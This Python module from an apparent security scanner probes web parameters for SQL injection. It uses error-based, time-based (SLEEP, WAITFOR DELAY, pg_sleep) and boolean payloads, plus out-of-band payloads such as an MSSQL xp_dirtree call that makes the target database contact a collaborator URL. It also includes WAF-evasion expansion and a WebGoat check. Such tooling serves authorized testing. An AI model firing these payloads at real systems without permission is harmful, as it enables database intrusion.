"""Error-based, time-based, and boolean-based SQL injection probes."""

from __future__ import annotations

import json
import statistics

import httpx

from shroodler.models import Finding
from shroodler.oob import collaborator_of, confirm_oob
from shroodler.pacer import Pacer
from shroodler.probes.common import (
    body_text,
    dedupe,
    inject,
    normalize_params,
    request,
    response_elapsed,
)
from shroodler.waf_detect import expand_if_waf

_ERROR_PAYLOADS = (
    "'",
    "' OR '1'='1",
    "'; --",
    "1 AND 1=2",
)
_TIME_PAYLOAD = "'; WAITFOR DELAY '0:0:2'--"
# One payload per common engine. Path-ID injection is skipped for these;
# eight delay payloads on /guilds/1/... is what burned 30-minute scans.
_TIME_PAYLOADS_4S = (
    "' AND SLEEP(4)--",
    "'; WAITFOR DELAY '0:0:4'--",
    "'; SELECT pg_sleep(4)--",
)
_BOOLEAN_TRUE = "' AND '1'='1"
_BOOLEAN_FALSE = "' AND '1'='2"
_ERROR_MARKERS = (
    "SQL syntax",
    "ORA-",
    "MySQL",
    "sqlite",
    "SQLSTATE",
    "Unclosed quotation",
    "syntax error",
    "pg_query",
    "Warning: mysql",
    "You have an error in your SQL syntax",
    "SqlException",
    "HsqlException",
    "JdbcSQLSyntaxErrorException",
    "unexpected token",
    "org.h2.jdbc",
)
_TIME_THRESHOLD = 2.0
_TIME_BASED_THRESHOLD = 3.5
_BASELINE_SKIP = 2.0
_BOOLEAN_LENGTH_RATIO = 0.20
_COLLAB_WAIT = 3.0


def _has_sql_error(body: str) -> bool:
    if not body:
        return False
    lowered = body.lower()
    return any(marker.lower() in lowered for marker in _ERROR_MARKERS)


def _webgoat_lesson_output(resp: httpx.Response | None, body: str) -> bool:
    """WebGoat confirms injection by returning lesson JSON with a non-empty output."""
    if resp is None or int(getattr(resp, "status_code", 0) or 0) != 200:
        return False
    if "lessoncompleted" not in (body or "").lower():
        return False
    try:
        data = json.loads(body)
    except (json.JSONDecodeError, TypeError, ValueError):
        return False
    if not isinstance(data, dict):
        return False
    output = data.get("output")
    if output is None:
        return False
    if isinstance(output, str):
        return bool(output.strip())
    return bool(output)


def _finding(
    *,
    finding_id: str,
    url: str,
    description: str,
    evidence: str,
    confidence: str,
    severity: str = "critical",
) -> Finding:
    return Finding(
        id=finding_id,
        severity=severity,  # type: ignore[arg-type]
        category="payload",
        url=url,
        description=description,
        evidence=evidence,
        confidence=confidence,  # type: ignore[arg-type]
    )


def _is_path_param(item: dict) -> bool:
    return str(item.get("in") or "").lower() == "path"


def _median_baseline(
    method: str,
    url: str,
    cookie_header: str,
    *,
    client: httpx.Client | None,
    pacer: Pacer | None,
    samples: int = 2,
) -> float | None:
    """Median elapsed of clean requests. None if every request failed."""
    elapsed: list[float] = []
    for _ in range(samples):
        resp = request(
            method,
            url,
            cookie_header=cookie_header,
            client=client,
            pacer=pacer,
        )
        if resp is None:
            continue
        elapsed.append(response_elapsed(resp, 0.0))
    if not elapsed:
        return None
    return float(statistics.median(elapsed))


def _boolean_differs(true_resp: httpx.Response, false_resp: httpx.Response) -> bool:
    true_status = int(getattr(true_resp, "status_code", 0) or 0)
    false_status = int(getattr(false_resp, "status_code", 0) or 0)
    if true_status != false_status:
        return True
    true_len = len(body_text(true_resp))
    false_len = len(body_text(false_resp))
    largest = max(true_len, false_len)
    if largest <= 0:
        return False
    return abs(true_len - false_len) / largest > _BOOLEAN_LENGTH_RATIO


def _oob_sqli_payloads(callback_url: str) -> tuple[str, ...]:
    """Conservative read-only-intent side channels. Confirm only on an HTTP hit."""
    mssql = (
        f"'; DECLARE @h varchar(1024); SET @h='{callback_url}'; "
        "EXEC master..xp_dirtree @h;--"
    )
    generic = f"' UNION SELECT '{callback_url}'--"
    return (mssql, generic)


def _probe_sqli_oob(
    url: str,
    method_u: str,
    normalized: list[dict],
    cookie_header: str,
    collab,
    *,
    client: httpx.Client | None,
    pacer: Pacer | None,
    state,
    waf_detected: bool,
    waf_vendor: str | None,
) -> Finding | None:
    try:
        minted = collab.mint("sqli")
    except Exception:  # noqa: BLE001
        return None
    payloads = expand_if_waf(
        _oob_sqli_payloads(minted.url),
        state=state,
        waf_detected=waf_detected,
        waf_vendor=waf_vendor,
    )
    for item in normalized:
        name = item["name"]
        for payload in payloads:
            inject(
                url,
                method_u,
                normalized,
                name,
                payload,
                cookie_header=cookie_header,
                client=client,
                pacer=pacer,
            )
    hit = confirm_oob(collab, minted.token, timeout=_COLLAB_WAIT)
    if hit is None:
        return None
    return _finding(
        finding_id="sqli-oob",
        url=url,
        description=(
            "A SQL injection payload triggered an out-of-band HTTP callback "
            "(confirmed blind SQLi)."
        ),
        evidence=(
            f"token={minted.token} url={minted.url} remote={hit.remote} "
            f"method={hit.method} path={hit.path}"
        ),
        confidence="confirmed",
        severity="high",
    )


def probe_sqli(
    url: str,
    method: str,
    params: list[dict],
    cookie_header: str,
    *,
    client: httpx.Client | None = None,
    pacer: Pacer | None = None,
    state=None,
    waf_detected: bool = False,
    waf_vendor: str | None = None,
    oob=None,
    time_based: bool = True,
) -> list[Finding]:
    """Replay GET/POST params with classic SQLi payloads, one param at a time.

    Cascade: error-based first; time-based only if error-based found nothing;
    boolean-based only if error-based and time-based found nothing.
    """
    method_u = (method or "GET").upper()
    if method_u not in {"GET", "POST"}:
        return []
    normalized = normalize_params(params)
    if not normalized:
        return []
    time_params = [item for item in normalized if not _is_path_param(item)]

    findings: list[Finding] = []
    collab = collaborator_of(oob, state)
    error_payloads = expand_if_waf(
        _ERROR_PAYLOADS,
        state=state,
        waf_detected=waf_detected,
        waf_vendor=waf_vendor,
    )
    time_payloads = expand_if_waf(
        _TIME_PAYLOADS_4S,
        state=state,
        waf_detected=waf_detected,
        waf_vendor=waf_vendor,
    )
    time_legacy = expand_if_waf(
        (_TIME_PAYLOAD,),
        state=state,
        waf_detected=waf_detected,
        waf_vendor=waf_vendor,
    )

    for item in normalized:
        name = item["name"]
        # Baseline (context awareness): a clean request with a benign value. If
        # it already surfaces a SQL error, the error is not payload-induced (a
        # persistent error page, or a param that always errors), so treating a
        # post-payload error as SQLi would be a false positive.
        base_resp = inject(
            url,
            method_u,
            normalized,
            name,
            "shroodler_baseline_probe",
            cookie_header=cookie_header,
            client=client,
            pacer=pacer,
        )
        baseline_errored = base_resp is not None and _has_sql_error(body_text(base_resp))
        for payload in error_payloads:
            resp = inject(
                url,
                method_u,
                normalized,
                name,
                payload,
                cookie_header=cookie_header,
                client=client,
                pacer=pacer,
            )
            if resp is None:
                continue
            body = body_text(resp)
            error_induced = _has_sql_error(body) and not baseline_errored
            if error_induced or _webgoat_lesson_output(resp, body):
                findings.append(
                    _finding(
                        finding_id="sqli",
                        url=url,
                        description=(
                            f"{method_u} parameter {name!r} reflected a database "
                            "error after a SQL injection payload (absent from a "
                            "clean baseline request)."
                        ),
                        evidence=f"param={name} payload={payload!r}",
                        confidence="confirmed",
                    )
                )
                return dedupe(findings)

    baseline = None
    if time_based and time_params:
        baseline = _median_baseline(
            method_u,
            url,
            cookie_header,
            client=client,
            pacer=pacer,
        )
    saw_time = False
    if (
        time_based
        and time_params
        and baseline is not None
        and baseline <= _BASELINE_SKIP
    ):
        for item in time_params:
            name = item["name"]
            hit_4s = False
            for payload in time_payloads:
                resp = inject(
                    url,
                    method_u,
                    normalized,
                    name,
                    payload,
                    cookie_header=cookie_header,
                    client=client,
                    pacer=pacer,
                )
                if resp is None:
                    continue
                elapsed = response_elapsed(resp, 0.0)
                if elapsed > baseline + _TIME_BASED_THRESHOLD:
                    findings.append(
                        _finding(
                            finding_id="sqli-time-based",
                            url=url,
                            description=(
                                f"{method_u} parameter {name!r} delayed the response "
                                "after a 4s time-based SQL injection payload."
                            ),
                            evidence=(
                                f"param={name} payload={payload!r} "
                                f"elapsed={elapsed:.2f}s baseline={baseline:.2f}s"
                            ),
                            confidence="confirmed",
                            severity="high",
                        )
                    )
                    saw_time = True
                    hit_4s = True
                    break
            if hit_4s:
                break
            # Keep the legacy 2s WAITFOR heuristic only when the 4s path
            # did not already confirm this param (avoid double-emitting).
            for payload in time_legacy:
                resp = inject(
                    url,
                    method_u,
                    normalized,
                    name,
                    payload,
                    cookie_header=cookie_header,
                    client=client,
                    pacer=pacer,
                )
                if resp is None:
                    continue
                elapsed = response_elapsed(resp, 0.0)
                if elapsed > baseline + _TIME_THRESHOLD:
                    findings.append(
                        _finding(
                            finding_id="sqli-blind",
                            url=url,
                            description=(
                                f"{method_u} parameter {name!r} delayed the response by more "
                                "than 2s after a WAITFOR DELAY payload (blind SQLi)."
                            ),
                            evidence=(
                                f"param={name} elapsed={elapsed:.2f}s "
                                f"baseline={baseline:.2f}s"
                            ),
                            confidence="heuristic",
                        )
                    )
                    saw_time = True
                    break
            if saw_time:
                break
        if saw_time:
            return dedupe(findings)

    for item in normalized:
        name = item["name"]
        true_payloads = expand_if_waf(
            (_BOOLEAN_TRUE,),
            state=state,
            waf_detected=waf_detected,
            waf_vendor=waf_vendor,
        )
        false_payloads = expand_if_waf(
            (_BOOLEAN_FALSE,),
            state=state,
            waf_detected=waf_detected,
            waf_vendor=waf_vendor,
        )
        true_resp = inject(
            url,
            method_u,
            normalized,
            name,
            true_payloads[0],
            cookie_header=cookie_header,
            client=client,
            pacer=pacer,
        )
        false_resp = inject(
            url,
            method_u,
            normalized,
            name,
            false_payloads[0],
            cookie_header=cookie_header,
            client=client,
            pacer=pacer,
        )
        if true_resp is None or false_resp is None:
            continue
        if not _boolean_differs(true_resp, false_resp):
            continue
        true_len = len(body_text(true_resp))
        false_len = len(body_text(false_resp))
        findings.append(
            _finding(
                finding_id="sqli-boolean-blind",
                url=url,
                description=(
                    f"{method_u} parameter {name!r} changed status or body length "
                    "between true and false boolean SQL payloads."
                ),
                evidence=(
                    f"param={name} true_status={int(true_resp.status_code)} "
                    f"false_status={int(false_resp.status_code)} "
                    f"true_len={true_len} false_len={false_len}"
                ),
                confidence="heuristic",
                severity="high",
            )
        )
        break

    if collab is not None and not findings:
        oob_finding = _probe_sqli_oob(
            url,
            method_u,
            normalized,
            cookie_header,
            collab,
            client=client,
            pacer=pacer,
            state=state,
            waf_detected=waf_detected,
            waf_vendor=waf_vendor,
        )
        if oob_finding is not None:
            findings.append(oob_finding)

    return dedupe(findings)
